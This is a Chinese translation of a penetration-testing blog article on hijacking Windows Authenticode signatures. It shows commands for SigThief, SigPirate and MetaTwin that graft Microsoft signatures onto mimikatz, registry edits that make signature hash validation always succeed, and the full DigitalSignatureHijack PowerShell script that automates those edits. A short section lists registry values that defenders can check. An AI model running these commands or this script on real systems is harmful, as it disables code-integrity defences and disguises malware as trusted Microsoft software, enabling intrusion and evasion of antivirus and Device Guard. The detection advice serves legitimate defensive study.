> 原文链接: https://www.anquanke.com//post/id/87238 


# 【技术分享】劫持数字签名与Powershell自动化过程


                                阅读量   
                                **150213**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：pentestlab.blog
                                <br>原文地址：[https://pentestlab.blog/2017/11/06/hijacking-digital-signatures/](https://pentestlab.blog/2017/11/06/hijacking-digital-signatures/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t0123ada5e3a81095ff.png)](https://p0.ssl.qhimg.com/t0123ada5e3a81095ff.png)

****

译者：[牧野之鹰](http://bobao.360.cn/member/contribute?uid=877906634)

预估稿费：260RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**前言**

开发人员通常会对其代码进行签名，以便向用户保证他们的软件是可信的，而且没有被恶意修改。 这都通过使用数字签名来完成的。 因此，签名代码是一种验证文件的真实性和完整性的方法。

安全人员与蓝队通常会检查二进制数字签名，以便执行初始检查，并确定是否应将其视为可疑文件。 诸如AppLocker和Device Guard之类的Microsoft防护技术支持一些特殊规则的使用，比如仅允许来自受信任的发布者的可执行文件和PowerShell脚本，并且这些文件想要在系统上运行必须有数字签名。 该验证通过使用证书来实现。

你可以通过PowerShell调用Get-AuthenticodeSignature或Sysinternals工具包中的的[SigCheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck)程序来进行数字签名的验证。

[![](https://p0.ssl.qhimg.com/t019dca91e58ead5994.png)](https://p0.ssl.qhimg.com/t019dca91e58ead5994.png)

[](https://twitter.com/mattifestation)[马特·格雷伯](https://twitter.com/mattifestation)在DerbyCon 2017的[](https://www.youtube.com/watch?v=wxmxxgL6Nz8)[主题演讲](https://www.youtube.com/watch?v=wxmxxgL6Nz8)中描述了如何通过执行签名验证攻击来执行系统上被设备保护策略锁定的的未签名代码。

**<br>**

**数字证书**

在现代Windows操作系统中，代码签名技术用于帮助用户识别来自不可信源的可信二进制文件。二进制文件通过使用数字证书进行签名，数字证书包含有关发布者，嵌入的私钥和公钥的信息。

authenticode签名可用于将签名的PowerShell脚本和二进制文件与未签名的文件分开。

[![](https://p0.ssl.qhimg.com/t0140a47b683311d0ab.png)](https://p0.ssl.qhimg.com/t0140a47b683311d0ab.png)

但是通过复制已经被签名过的PowerShell脚本的签名块，然后将其应用到尚未签名的PowerShell脚本中，我们就可以轻松劫持PowerShell脚本的证书。 下面的这个脚本是Windows系统的一部分，并已具有Microsoft签名。

[![](https://p5.ssl.qhimg.com/t016528c1d3d480082e.png)](https://p5.ssl.qhimg.com/t016528c1d3d480082e.png)

注册表中的CryptSIPDllGetSignedDataMsg表项包含处理默认PowerShell SIP（pwrshsip.dll）和本机PowerShell脚本数字签名的注册表项：

```
HKLMSOFTWAREMicrosoftCryptographyOIDEncodingType 0CryptSIPDllGetSignedDataMsg`{`603BCC1F-4B59-4E08-B724-D2C6297EF351`}`
```

我们需要用自定义的SIP和GetLegitMSSignature函数来替换该密钥原本的DLL键和FuncName键的值。马特·格雷伯创建了一个自定义的[SIP](https://github.com/mattifestation/PoCSubjectInterfacePackage)（Subject Interface Package），我们可以将其编译，然后用它让未签名的PowerShell脚本获得合法的Microsoft签名。 这个DLL的编译版本可以在[GitHub](https://github.com/netbiosX/Digital-Signature-Hijack)上找到。替换后如下：



```
DLL - C:UsersUserMySIP.dll
FuncName - GetLegitMSSignature
```



[![](https://p0.ssl.qhimg.com/t01755d11cb41e06b0c.png)](https://p0.ssl.qhimg.com/t01755d11cb41e06b0c.png)

替换之后，合法的数字签名就可以应用于脚本了，我们可以在PowerShell控制台上再次调用Get-AuthenticodeSignature模块来验证一下。

[![](https://p3.ssl.qhimg.com/t010fcdb4722a52ee47.png)](https://p3.ssl.qhimg.com/t010fcdb4722a52ee47.png)

可以看到，虽然签名有了，数字签名的验证却会失败，因为authenticode哈希不匹配。

除此之外，我们还可以使用各种工具来劫持可信任二进制文件的证书，然后将其用于非法的二进制文件。

[](https://github.com/secretsquirrel/SigThief)

```
SigThief:
python sigthief.py -i consent.exe -t mimikatz.exe -o signed-mimikatz.exe
```

[![](https://p2.ssl.qhimg.com/t01a056b0ee4b1d3e64.png)](https://p2.ssl.qhimg.com/t01a056b0ee4b1d3e64.png)

[](https://github.com/xorrior/Random-CSharpTools/tree/master/SigPirate)

```
SigPirate:
SigPirate.exe -s consent.exe -d mimikatz.exe -o katz.exe -a
```

[![](https://p0.ssl.qhimg.com/t010e2e5ad138f48bd5.png)](https://p0.ssl.qhimg.com/t010e2e5ad138f48bd5.png)

上图中的Consent.exe文件本身是Windows操作系统的一部分，因此它有Microsoft的数字签名。经过一番操作，下面这个二进制文件已经有了微软的数字签名。

[![](https://p1.ssl.qhimg.com/t01878ae211cd642bc6.png)](https://p1.ssl.qhimg.com/t01878ae211cd642bc6.png)

但是，和前面一样，数字签名验证将无法通过。

**<br>**

**绕过签名验证**

Authenticode是一种Microsoft代码签名技术，蓝队可以使用该技术通过数字证书来识别发布者的身份，并验证二进制文件因为经过了数字签名哈希验证而未被篡改。

所以即使可信证书被盗用于恶意二进制文件，但不能通过数字签名验证，因为authenticode哈希不匹配。 而无效的authenticode哈希表明，该二进制文件不合法。 实际操作中，针对这种盗用可信证书的二进制文件，如果从PowerShell控制台执行Get-AuthenticodeSignature对其进行验证，将产生HashMismatch（哈希不匹配）错误。

[![](https://p1.ssl.qhimg.com/t01dcfc2f62b11f1767.png)](https://p1.ssl.qhimg.com/t01dcfc2f62b11f1767.png)

这是因为可执行代码由数字证书的私钥签名。 公钥被嵌入在证书本身中。 由于私钥是未知的，攻击者不能为非法二进制文件生成正确的哈希值，只能盗用其他文件的，因此验证过程总是会失败，因为哈希值不匹配。

所以，我们需要通过修改注册表来削弱数字签名验证机制。马特·格雷伯发现了散列验证过程在注册表中的位置以及执行的方式。 而CryptSIPDllVerifyIndirectData组件就是用来处理PowerShell脚本和PE文件的数字签名验证的。

数字签名的哈希验证就是通过以下注册表键值执行的：



```
`{`603BCC1F-4B59-4E08-B724-D2C6297EF351`}` // Hash Validation for PowerShell Scripts
`{`C689AAB8-8E78-11D0-8C47-00C04FC295EE`}` // Hash Validation for Portable Executables
```

这些键值存在于以下注册表位置中：



```
HKLMSOFTWAREMicrosoftCryptographyOIDEncodingType 0CryptSIPDllVerifyIndirectData`{`603BCC1F-4B59-4E08-B724-D2C6297EF351`}`
HKLMSOFTWAREMicrosoftCryptographyOIDEncodingType 0CryptSIPDllVerifyIndirectData`{`C689AAB8-8E78-11D0-8C47-00C04FC295EE`}`
```

那怎么做才能达到削弱签名验证机制的目的呢？这里我们需要使用另一个合法的DLL文件来替换掉原来的键值表示的DLL，因为它应该已经使用相同的私钥签名。 另外，我们还需要将注册表项原来的函数用一个名叫DbgUiContinue的函数替换掉，选这个函数是因为它也接受两个参数，如原来的函数一样。如果组件CryptSIPDllVerifyIndirectData成功，则返回TRUE。

修改后的键值如下：



```
DLL - C:WindowsSystem32ntdll.dll
FuncName - DbgUiContinue
```

[![](https://p0.ssl.qhimg.com/t01d301cd0c0174742f.png)](https://p0.ssl.qhimg.com/t01d301cd0c0174742f.png)

重新启动一个新的PowerShell进程就可以完成哈希验证的绕过了。 恶意二进制文件将显示签名并具有有效的Microsoft签名。

[![](https://p5.ssl.qhimg.com/t01d78920507e67a25a.png)](https://p5.ssl.qhimg.com/t01d78920507e67a25a.png)

[![](https://p0.ssl.qhimg.com/t018e15f6b27338e72a.png)](https://p0.ssl.qhimg.com/t018e15f6b27338e72a.png) 

马特·格雷伯最初发现了这种绕过方式，在他的文章《[Subverting Trust in Windows](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)》中有详细的解释。 他还发布了一个PowerShell脚本，可以用来自动化签名验证攻击。

该脚本的目标就是修改执行PowerShell脚本和PE文件的数字签名的哈希验证的两个注册表项。

[![](https://p1.ssl.qhimg.com/t0161394967fc1fae1a.png)](https://p1.ssl.qhimg.com/t0161394967fc1fae1a.png)

以下注册表值将被自动修改为所需的值，以绕过散列验证。

[![](https://p5.ssl.qhimg.com/t010f0b2e01972a0b83.png)](https://p5.ssl.qhimg.com/t010f0b2e01972a0b83.png)

运行PowerShell脚本将开始绕过。

```
powershell.exe -noexit -file C:Python34SignatureVerificationAttack.ps1
```

[![](https://p2.ssl.qhimg.com/t01065f552210216fc4.png)](https://p2.ssl.qhimg.com/t01065f552210216fc4.png)

执行Get-AuthenticodeSignature PowerShell模块将产生有效的数字签名散列。

[![](https://p2.ssl.qhimg.com/t01ad6d84a9c68d0f04.png)](https://p2.ssl.qhimg.com/t01ad6d84a9c68d0f04.png)

**<br>**

**元数据**

一些杀毒软件公司依靠数字签名和元数据来识别恶意文件。 因此，针对使用来自可信实体的有效证书和元数据的非合法二进制文件的病毒检测率将会降低。

[](https://github.com/minisllc/metatwin)[MetaTwin](https://github.com/minisllc/metatwin)是基于PowerShell的脚本，可以将文件中的元数据自动复制到另一个二进制文件中。



```
PS C:metatwin&gt; Import-Module .metatwin.ps1
PS C:metatwin&gt; Invoke-MetaTwin -Source C:WindowsSystem32netcfgx.dll -Target .mimikatz.exe -Sign
```

[![](https://p2.ssl.qhimg.com/t01ab841ea579135b83.png)](https://p2.ssl.qhimg.com/t01ab841ea579135b83.png)

最重要的是，它可以从Microsoft文件中窃取数字签名，它使用SigThief来执行此任务。

[![](https://p0.ssl.qhimg.com/t010176c96473333224.png)](https://p0.ssl.qhimg.com/t010176c96473333224.png)

最终的可执行文件将包含元数据细节和Microsoft的数字签名。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c4ed3e174efad2fc.png)

我们可以通过检查文件属性中的详细信息选项卡来验证。

[![](https://p1.ssl.qhimg.com/t011377d8299964e57d.png)](https://p1.ssl.qhimg.com/t011377d8299964e57d.png)

如果已经通过注册表对系统进行了修改，绕过了数字签名的哈希验证，那么恶意二进制文件将看起来像是被Microsoft这样的可信实体签名的。

[![](https://p1.ssl.qhimg.com/t01b76523d61cdb9f93.png)](https://p1.ssl.qhimg.com/t01b76523d61cdb9f93.png)

**<br>**

**结论**

劫持合法的数字签名并绕过Windows的哈希验证机制可以被红队用于将恶意二进制文件和PowerShell脚本与本机操作系统文件混合，以逃避检测并绕过设备防护。总结：

1.管理员访问权限是执行此攻击所必需的

2.数字签名的可执行文件不会出现在Autoruns默认视图中

3.数字签名代码的病毒检测率较低

蓝队可以执行以下两个步骤，以快速确定系统上是否发生数字签名劫持攻击。

1.使用Get-AuthenticodeSignature验证数字签名哈希的有效性

2.查看以下注册表项和值：



```
HKLMSOFTWAREMicrosoftCryptographyOIDEncodingType 0CryptSIPDllGetSignedDataMsg`{`603BCC1F-4B59-4E08-B724-D2C6297EF351`}`
DLL - C:WindowsSystem32WindowsPowerShellv1.0pwrshsip.dll
FuncName - PsGetSignature
HKLMSOFTWAREMicrosoftCryptographyOIDEncodingType 0CryptSIPDllGetSignedDataMsg`{`C689AAB8-8E78-11D0-8C47-00C04FC295EE`}`
DLL - C:WindowsSystem32ntdll.dll
FuncName - CryptSIPGetSignedDataMsg
HKLMSOFTWAREMicrosoftCryptographyOIDEncodingType 0CryptSIPDllVerifyIndirectData`{`603BCC1F-4B59-4E08-B724-D2C6297EF351`}`
DLL - C:WindowsSystem32WindowsPowerShellv1.0pwrshsip.dll
FuncName - PsVerifyHash
HKLMSOFTWAREMicrosoftCryptographyOIDEncodingType 0CryptSIPDllVerifyIndirectData`{`C689AAB8-8E78-11D0-8C47-00C04FC295EE`}`
DLL - C:WindowsSystem32WINTRUST.DLL
FuncName - CryptSIPVerifyIndirectData
```



**Powershell自动化过程**

**一般信息**

DigitalSignatureHijack基于PowerShell，可以从具有管理员权限的PowerShell控制台执行。 设计想法是通过只执行四个命令来快速地对PowerShell脚本和PE文件进行数字签名。

**命令**

该脚本接受以下命令：

**SignExe                     – 给PE文件签名**

**SignPS                       – 给PowerShell脚本签名**

**ValidateSignaturePE  – PE文件的签名验证**

**ValidateSignaturePS  – PowerShell脚本的签名验证**

**依赖**

DigitalSignature-Hijack依赖马特·格雷伯开发的自定义SIP（Subject Interface Package）dll文件。 因此，需要将其存储在目标系统的某个位置，并且需要使用该DLL文件的新位置来更新脚本，否则注册表劫持将不起作用。

[](https://github.com/netbiosX/Digital-Signature-Hijack)[编译版本的MySIP.dll](https://github.com/netbiosX/Digital-Signature-Hijack)

[](https://github.com/mattifestation/PoCSubjectInterfacePackage)[MySIP DLL的源代码](https://github.com/mattifestation/PoCSubjectInterfacePackage)

**演示**

以下是可用于对主机上存在的所有PowerShell脚本和PE文件进行数字签名的命令。

[![](https://p5.ssl.qhimg.com/t016b73ecdb540c1128.png)](https://p5.ssl.qhimg.com/t016b73ecdb540c1128.png)

**要签署的二进制文件**

Mimikatz为人们所熟知。它不是Windows的一部分，也不是由微软数字签名的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0140bbf6c591f7b3ac.png)

SignExe命令将会为Mimikatz提供一个Microsoft证书。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cc63de5a4e1a64ef.png)

签名验证：

劫持合法证书将产生哈希不匹配错误，导致数字签名将无法通过验证。

[![](https://p1.ssl.qhimg.com/t017d29cf5584dc7c23.png)](https://p1.ssl.qhimg.com/t017d29cf5584dc7c23.png)

执行ValidateSignaturePE命令将准确的验证存储在系统上的所有PE文件的数字签名。

[![](https://p3.ssl.qhimg.com/t013f99059c06518a06.png)](https://p3.ssl.qhimg.com/t013f99059c06518a06.png)

**签名PowerShell脚本**

DigitalSignature-Hijack PowerShell脚本没有签名。 因此，在开启了设备保护UMCI（User Mode Code Integrity：用户模式代码完整性）的情况下，需要对其进行签名。

[![](https://p3.ssl.qhimg.com/t01bfc72915237b493c.png)](https://p3.ssl.qhimg.com/t01bfc72915237b493c.png)

执行SignPS命令将为Microsoft PowerShell脚本提供一个Microsoft证书。

[![](https://p0.ssl.qhimg.com/t01074229fad2f60b82.png)](https://p0.ssl.qhimg.com/t01074229fad2f60b82.png)

签名验证：

与PE文件一样，Microsoft也正在对PowerShell脚本的数字签名进行验证。

[![](https://p1.ssl.qhimg.com/t010cf31dfb9dc921f7.png)](https://p1.ssl.qhimg.com/t010cf31dfb9dc921f7.png)

执行ValidateSignaturePS命令将绕过验证，因此数字签名将显示为有效。

[![](https://p0.ssl.qhimg.com/t0133fb72fd46e7ae58.png)](https://p0.ssl.qhimg.com/t0133fb72fd46e7ae58.png)

**下载**

DigitalSignatureHijack脚本可以在以下地址下载：

[](https://gist.github.com/netbiosX/fe5b13b4cc59f9a944fe40944920d07c)[Digital Signature Hijack Public Gist](https://gist.github.com/netbiosX/fe5b13b4cc59f9a944fe40944920d07c)

[](https://github.com/netbiosX/Digital-Signature-Hijack)[https://github.com/netbiosX/Digital-Signature-Hijack](https://github.com/netbiosX/Digital-Signature-Hijack)

**源码**

```
&lt;#
    DigitalSignatureHijack v1.0
    License: GPLv3
    Author: @netbiosX
#&gt;
 
# Validate Digital Signature for PowerShell Scripts
 
function ValidateSignaturePS
`{`
        $ValidateHashFunc = 'HKLM:SOFTWAREMicrosoftCryptography' +'OIDEncodingType 0CryptSIPDllVerifyIndirectData'
 
        # PowerShell SIP Guid
 
        $PSIPGuid = '`{`603BCC1F-4B59-4E08-B724-D2C6297EF351`}`'
 
        $PSSignatureValidation = Get-Item -Path "$ValidateHashFunc$PSIPGuid"
 
        $NewDll = 'C:UsersUserDesktopSignature SigningBinariesMySIP.dll'
        $NewFuncName = 'AutoApproveHash'
        
        $PSSignatureValidation | Set-ItemProperty -Name Dll -Value $NewDll
        $PSSignatureValidation | Set-ItemProperty -Name FuncName -Value $NewFuncName
`}`
 
# Validate Digital Signature for Portable Executables
 
function ValidateSignaturePE
`{`
        $ValidateHashFunc = 'HKLM:SOFTWAREMicrosoftCryptography' +'OIDEncodingType 0CryptSIPDllVerifyIndirectData'
 
        # PE SIP Guid
 
        $PESIPGuid = '`{`C689AAB8-8E78-11D0-8C47-00C04FC295EE`}`'
 
$PESignatureValidation = Get-Item -Path "$ValidateHashFunc$PESIPGuid"
        
        $NewDll = 'C:WindowsSystem32ntdll.dll'
        $NewFuncName = 'DbgUiContinue'
        
        $PESignatureValidation | Set-ItemProperty -Name Dll -Value $NewDll
        $PESignatureValidation | Set-ItemProperty -Name FuncName -Value $NewFuncName
`}`
 
# Sign PowerShell Scripts with a Microsoft Certificate
 
function SignPS
`{`
        $GetCertFunc = 'HKLM:SOFTWAREMicrosoftCryptography' +'OIDEncodingType 0CryptSIPDllGetSignedDataMsg'
 
        # PowerShell SIP Guid
 
        $PSIPGuid = '`{`603BCC1F-4B59-4E08-B724-D2C6297EF351`}`'
 
        $PEGetMSCert = Get-Item -Path "$GetCertFunc$PSIPGuid"
 
        $NewDll = 'C:UsersUserDesktopSignature SigningBinariesMySIP.dll'
        $NewFuncName = 'GetLegitMSSignature'
        
        $PEGetMSCert | Set-ItemProperty -Name Dll -Value $NewDll
        $PEGetMSCert | Set-ItemProperty -Name FuncName -Value $NewFuncName
`}`
 
# Sign Portable Executables with a Microsoft Certificate
 
function SignExe
`{`
        $GetCertFunc = 'HKLM:SOFTWAREMicrosoftCryptography' +'OIDEncodingType 0CryptSIPDllGetSignedDataMsg'
 
        # PE SIP Guid
 
        $PESIPGuid = '`{`C689AAB8-8E78-11D0-8C47-00C04FC295EE`}`'
 
        $PEGetMSCert = Get-Item -Path "$GetCertFunc$PESIPGuid"
 
        $NewDll = 'C:UsersUserDesktopSignature SigningBinariesMySIP.dll'
        $NewFuncName = 'GetLegitMSSignature'
        
        $PEGetMSCert | Set-ItemProperty -Name Dll -Value $NewDll
        $PEGetMSCert | Set-ItemProperty -Name FuncName -Value $NewFuncName
```



**参考**

1.[https://github.com/secretsquirrel/SigThief](https://github.com/secretsquirrel/SigThief)

2.[](https://github.com/xorrior/Random-CSharpTools/tree/master/SigPirate)[https://github.com/xorrior/Random-CSharpTools/tree/master/SigPirate](https://github.com/xorrior/Random-CSharpTools/tree/master/SigPirate)

3.[](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)[https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)

4.[](https://github.com/minisllc/metatwin)[https://github.com/minisllc/metatwin](https://github.com/minisllc/metatwin)

5.[](https://github.com/mattifestation/PoCSubjectInterfacePackage)[https://github.com/mattifestation/PoCSubjectInterfacePackage](https://github.com/mattifestation/PoCSubjectInterfacePackage)

6.[](https://github.com/netbiosX/Digital-Signature-Hijack)[https://github.com/netbiosX/Digital-Signature-Hijack](https://github.com/netbiosX/Digital-Signature-Hijack)

7.[](https://github.com/mstefanowich/FileSignatureHijack)[https://github.com/mstefanowich/FileSignatureHijack](https://github.com/mstefanowich/FileSignatureHijack)

8.[](http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html)[http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html](http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html)

9.[](https://gist.github.com/mattifestation/439720e2379f4bc93f0ed3ce88814b5b)[https://gist.github.com/mattifestation/439720e2379f4bc93f0ed3ce88814b5b](https://gist.github.com/mattifestation/439720e2379f4bc93f0ed3ce88814b5b)

10.[](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck)[](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck)[https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck)
